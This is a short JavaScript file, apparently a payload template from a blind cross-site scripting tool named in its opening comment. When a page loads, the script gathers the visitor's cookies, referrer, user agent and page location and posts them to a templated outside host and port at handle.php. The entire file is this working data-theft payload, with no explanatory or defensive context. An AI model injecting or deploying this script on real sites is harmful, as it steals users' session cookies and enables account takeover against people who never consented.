
//https://www.github.com/mdhama/blindAlert

function send(a) {
    var t = new XMLHttpRequest
    t.open("POST", "http://{{host}}:{{port}}/handle.php", true)
    t.setRequestHeader("Content-type", "text/plain")
    t.send(JSON.stringify(a))
}
function getData() {
    var data = {}
    data.cookies = document.cookie
    data.referrer = document.referrer
    data.userAgent = navigator.userAgent
    data.origin = location.origin
    data.href = location.href
    data.host = location.host
    send(data)
}
window.onload = function () {
    getData()
}

